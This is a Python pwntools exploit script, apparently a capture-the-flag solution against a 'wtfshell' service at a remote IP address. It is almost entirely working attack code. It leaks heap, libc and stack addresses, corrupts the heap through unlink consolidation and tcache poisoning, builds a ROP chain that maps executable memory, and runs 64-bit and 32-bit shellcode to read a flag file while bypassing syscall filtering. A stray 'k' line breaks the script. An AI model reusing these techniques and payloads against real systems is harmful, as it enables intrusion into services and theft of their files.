from pwn import *
import time

a = open("log", "w")

# r = process("./wtfshell")
r = remote("35.233.147.96", 42531)

def rec_orig(): return r.recvuntil("\xe2\x88\x9a ")
def rec2(): return r.recvuntil("e ")
rec = rec_orig

rec()
r.sendline("stfu.B")
r.sendline("stfu.A")
rec()

leak = "\x80"

r.sendline("asap.A")
r.recvuntil(":")
r.send("A"*0x40)
r.recvuntil(":")
r.send("A"*0x40)

while len(leak) < 6:
	for c in range(0, 256):
		if c == 10:
			continue
		print(c)

		a = ""
		r.send(chr(c) + "\n")
		try:
			a = r.recvuntil("\xe2\x88\x9a ", timeout=0.5)
		except:
			pass

		if "\xe2\x88\x9a" not in a or "Q.E.D" in a:
			leak += chr(c)
			print(leak)
			break
		else:
			r.sendline("asap.A")
			r.recvuntil(":")
			r.send("A"*0x40)
			r.recvuntil(":")
			r.send("A"*0x40)
			for k in leak:
				r.send(k)

heap = u64(leak + "\x00\x00")
print("HEAP", hex(heap))

r.sendline("sus.A")
r.sendline("A")
r.sendline("sus")
rec()

files = [chr(0x41 + i) for i in range(30)]
for i in range(20):
	r.sendline("nsfw.{}.3".format(files[i]))
	rec()
r.sendline("wtf." + "B"*0x3f8 + ".A")
rec()
for i in range(12):
	r.sendline("rip.A")
	if i == 0:
		payload = "A"*8 + "/\x03//////"
		r.send(payload + "A"*(0x100 - len(payload)))
	else:
		r.send("D"*0x100)
	rec()

r.sendline("wtf." + "B"*0x3f8 + ".B")
rec()

for i in range(4, 4+6):
	r.sendline("wtf." + "B"*0x3f8 + "." + files[i]) # E, F, G, H, I, J
	rec()
for i in range(4+6, 4+6+7):
	r.sendline("wtf." + "B"*0x2e8 + "." + files[i]) # E, F, G, H, I, J
	rec()

r.sendline("rip.A")
r.send("D"*0x100)
rec()


r.sendline("wtf." + "B"*0x3f8 + ".C") # 0x410 chunk
rec()

r.sendline("wtf." + "D"*0x3f8 + ".D")
rec()
for i in range(4):
	r.sendline("rip.D")
	r.send("D"*0x100)
	rec()

for i in range(4+6, 4+6+7):
	r.sendline("gtfo." + files[i])
	rec()
r.sendline("gtfo.E")
r.sendline("gtfo.F")
r.sendline("gtfo.G")
r.sendline("gtfo.H")
r.sendline("gtfo.I")
r.sendline("gtfo.J")
r.sendline("rip.C")
r.sendline("B"*0x10)
for i in range(7): rec()

r.sendline("irl")
rec()

# Now let's construct 0x321 victim
for i in range(20):
	r.sendline("nsfw.{}.3".format(files[i]))
	rec()

r.sendline("wtf." + "A"*0x2b8 + ".A")
rec()

r.sendline("wtf." + "E"*0x208 + ".B") # B is victim
rec()
r.sendline("rip.B")
r.send("E"*0x100)
rec()

# Eat up other bins
r.sendline("wtf." + "A"*0x170 + ".C")
rec()
r.sendline("wtf." + "A"*0x130 + ".D")
rec()
r.sendline("wtf." + "A"*0xb0 + ".E")
rec()
r.sendline("wtf." + "A"*0x30 + ".F")
rec()
r.sendline("wtf." + "A"*0x220 + ".G")
rec()
r.sendline("wtf." + "A"*0x220 + ".H")
rec()

# Trigger bug
r.send("A"*0x400)
rec()
r.send("gtfo." + "A"*(0x400 - 5))
rec()

for i in range(6):
	r.sendline("wtf." + "F"*(0x2f8 + (6 - i)) + "\x31" + ".B")
	rec()

r.sendline("wtf." + "F"*0x2f8 + "\x01\x09" + ".B")
rec()

victim_addr = heap + 0xa30
fake_fd_bk  = heap + 0x740
fake_unlink = fake_fd_bk - 0x10

# Do backwards consolidation
payload = "gtfo.B."
payload += "A"*(0x100-len(payload)) + p64(0x0) + p64(0x301) + p64(fake_fd_bk) + p64(fake_fd_bk) + p64(fake_unlink)*2
r.sendline(payload)
rec()

for i in range(2):
	uname = chr(0x41 + i)*2
	r.sendline("stfu,{}.".format(uname))
	rec()

rec = rec2
r.sendline("sus.BB")
rec()
r.sendline("nsfw.flag.3")
rec()

flag_loc = heap - 0x520
libc_leak_loc = heap + 0x158

payload = "A"*0xff + "." + p64(0x0) + p64(0x61) + "B"*0x40 + p64(libc_leak_loc) + "\x02"
r.sendline(payload)
rec()

r.sendline("lol.-l")
# libc_base = u64(rec().split("\n")[2][3:][:6] + "\x00\x00") - 0x219ce0
libc_base = u64(rec().split("\n")[2][3:][:6] + "\x00\x00") - 0x1f6cc0
# environ   = libc_base + 0x221200
environ   = libc_base + 0x1fe320
print("LIBC", hex(libc_base))

payload = "A"*0xff + "." + p64(0x0) + p64(0x61) + "B"*0x40 + p64(environ) + "\x02"
r.sendline(payload)
rec()
rec()

r.sendline("lol.-l")
stack = u64(rec().split("\n")[2][3:][:6] + "\x00\x00") - 0x8 - 0x148 - 0x8 + 0x110
ret_addr = stack - 0x110
rec()
print("STACK", hex(stack))


# Now get arbitrary write using files I and J
r.sendline("sus")
rec = rec_orig
rec()

r.sendline("wtf." + "I"*0x100 + ".I")
rec()
r.sendline("wtf." + "J"*0x100 + ".J")
rec()
r.sendline("wtf." + "K"*0x100 + ".K")
rec()

r.sendline("gtfo.I")
rec()
r.sendline("gtfo.J")
rec()

payload = "A"*0xff + "." + p64(0x0) + p64(0x61) + "\x00"*0x40 + p64(environ) + p32(0x2) + p32(0x0) + p64(0x0) + p64(0x61) + "\x00"*0x40 + p64(flag_loc) + p64(0x2) + p64(0x0) + p64(0x21) + p64(heap+0x820) + p64(0x0) + p32(0x2) + p32(0x3) + p64(0x21) + "A"*8 + "B"*8 + p64(0x0) + p64(0x111)
payload += p64(((heap+0x840) >> 12) ^ (stack))
r.sendline(payload)

r.sendline("wtf." + "I"*0x100 + ".L")
rec()

r.sendline("wtf." + "A"*0x100 + ".M") # M is where ropchain lives
rec()

two_pop_2 = libc_base + 0x000000000002ec73 # pop rbp ; pop r12 ; ret
k
two_pop = libc_base + 0x0000000000023e75 # pop rdi ; pop rbp ; ret
pop_rdi = libc_base + 0x0000000000023b65 # pop rdi ; ret
pop_rsi = libc_base + 0x00000000000251be # pop rsi ; ret
pop_rdx = libc_base + 0x0000000000165f32 # pop rdx ; ret
open64  = libc_base + 0x10c7c0
pop_rax = libc_base + 0x000000000003f8e3 # pop rax ; ret
syscall = libc_base + 0x8cad6
pop_rcx = libc_base + 0x00000000000e236e # pop rcx ; ret
pop_rsp = libc_base + 0x000000000002eb31 # pop rsp ; ret
pop_r12 = libc_base + 0x000000000002eb30 # pop r12 ; ret
pop_r8_gadget = libc_base + 0x000000000014c66a # mov r8, rbp ; mov rcx, r14 ; mov rdi, r13 ; call r12
pop_rbp = libc_base + 0x0000000000023a60 # pop rbp ; ret
mmap = libc_base + 0x116ba0
pop_r9_gadget = libc_base + 0x00000000000241c4 # mov r9, qword ptr [rsp + 0x10] ; mov rsi, rbp ; call r15
pop_r15 = libc_base + 0x0000000000023b64 # pop r15 ; ret
retf = libc_base + 0x0000000000022ad1 # retf


context.bits = 64
context.arch = "amd64"
# write the ropchain
ropchain = "/flag2\x00\x00"
ropchain += flat([
	pop_r15, pop_rax,
	pop_r9_gadget,

	two_pop_2, 0xffffffff, 0x0,
	pop_r12, pop_rdi,
	pop_r8_gadget,

	pop_rdi, 0x13370000,
	pop_rsi, 0x2000,
	pop_rdx, 0x3,
	pop_rcx, 34,
	mmap,

	pop_rdi, 0,
	pop_rsi, 0x13370000,
	pop_rdx, 0x1000,
	pop_rax, 0,
	syscall,

	pop_rsp, 0x13370000,
])
assert "\n" not in ropchain
print("LENGTH", hex(len(ropchain)))
writes = [i + "\x00" for i in ropchain[::-1].split("\x00")]
print("WRITES", writes)
offset = len(ropchain) + 1
for w in writes:
	pay = "A"*(offset - len(w)) + w[:-1][::-1]
	print(pay)
	r.sendline("wtf." + pay + ".M")
	rec()
	offset -= len(w)

# Now stack pivot
r.sendline("gtfo.L")
rec()
r.sendline("gtfo.K")
rec()

payload = "A"*0xff + "." + p64(0x0) + p64(0x61) + "\x00"*0x40 + p64(environ) + p32(0x2) + p32(0x0) + p64(0x0) + p64(0x61) + "\x00"*0x40 + p64(flag_loc) + p64(0x2) + p64(0x0) + p64(0x21) + p64(heap+0x820) + p64(0x0) + p32(0x2) + p32(0x3) + p64(0x21) + "A"*8 + "B"*8 + p64(0x0) + p64(0x111)
payload += "A"*0x100 + p64(0x0) + p64(0x111) + p64(((heap+0x950) >> 12) ^ (ret_addr-0x130))
r.sendline(payload)

r.sendline("wtf." + "I"*0x100 + ".N")
rec()

# add_rsp_gadget = libc_base + 0x000000000004240a # add rsp, 0x148 ; ret
add_rsp_gadget = libc_base + 0x000000000003bbfd # add rsp, 0x148 ; ret
print("GADGET", hex(add_rsp_gadget))

r.sendline("wtf." + "A"*0xf8 + p64(add_rsp_gadget).replace("\x00", "") + ".O") # O is where ret_addr lives

ropchain = flat([
	pop_r15, pop_rax,
	pop_r9_gadget,

	two_pop_2, 0xffffffff, 0x0,
	pop_r12, pop_rdi,
	pop_r8_gadget,

	pop_rdi, 0x41410000,
	pop_rsi, 0x2000,
	pop_rdx, 0x6,
	pop_rcx, 34,
	mmap,

	pop_rdi, 0,
	pop_rsi, 0x41410000, # 64-bit shellcode
	pop_rdx, 0x1000,
	pop_rax, 0,
	syscall,

	pop_r15, pop_rax,
	pop_r9_gadget,

	two_pop_2, 0xffffffff, 0x0,
	pop_r12, pop_rdi,
	pop_r8_gadget,

	pop_rdi, 0x42420000, # 32-bit shellcode
	pop_rsi, 0x2000,
	pop_rdx, 0x6,
	pop_rcx, 34,
	mmap,

	pop_rdi, 0,
	pop_rsi, 0x42420000,
	pop_rdx, 0x1000,
	pop_rax, 0,
	syscall,
	0x41410000
])

time.sleep(0.1)
r.send(ropchain + "A"*(0x1000-len(ropchain) - 8) + "/flag2\x00\x00")
time.sleep(0.1)

# 64-bit sc
shellcode = "\x48\x31\xE4\xBC\x00\x0C\x37\x13\x67\xC7\x44\x24\x04\x23\x00\x00\x00\x67\xC7\x04\x24\x00\x00\x42\x42\xCB"
shellcode += "\x90"*(0x100-len(shellcode))
shellcode += asm("""
mov rdi, rax
mov rax, 0x100
push rax
mov rax, 0x13370000
push rax

mov rsi, rsp
mov rdx, 1
mov r10, 0
mov r8, 0
mov rax, 295
syscall

mov rdi, 1
mov rsi, rsp
mov rdx, 1
mov rax, 20
syscall

lmao:
jmp lmao

""")
shellcode += "\xeb\xfe"
r.send(shellcode + "A"*(0x1000-len(shellcode)))

time.sleep(0.1)
# 32-bit sc
shellcode = "\xB8\x27\x01\x00\x00\xBB\x00\x04\x00\x00\xB9\xF8\x0F\x37\x13\xBA\x00\x00\x00\x00\xBE\x00\x00\x00\x00\xBF\x03\x00\x00\x00\xCD\x80\xBC\x00\x0D\x37\x13\xC7\x44\x24\x04\x33\x00\x00\x00\xC7\x04\x24\x00\x01\x41\x41\xCB"
r.send(shellcode + "A"*(0x800-len(shellcode)) + "/flag2\x00")
r.interactive()